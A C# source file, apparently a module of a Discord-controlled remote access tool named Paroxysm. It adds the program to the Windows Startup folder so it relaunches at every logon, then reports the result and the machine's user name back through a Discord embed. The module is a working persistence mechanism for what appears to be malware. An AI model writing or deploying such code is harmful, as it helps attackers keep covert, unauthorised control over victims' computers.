using Discord;
using IWshRuntimeLibrary;
using Paroxysm.Discord;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class AutoRunAction
{
    public static Embed Follow()
    {
        var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        var appPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Paroxysm.exe");
        const string shortcutName = "Paroxysm.lnk";

        var shortcutPath = Path.Combine(startupFolderPath, shortcutName);

        try
        {
            if (!Directory.Exists(startupFolderPath))
            {
                Directory.CreateDirectory(startupFolderPath);
            }

            WshShell shell = new();
            var shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = appPath;
            shortcut.Save();

            return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed",
                "Application has been added to startup.", Environment.UserName, null);
        }
        catch (Exception exception)
        {
            Logger.ThrowEmbedError(exception);
        }

        return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
            "Cannot add application to startup.", Environment.UserName, null);
    }
}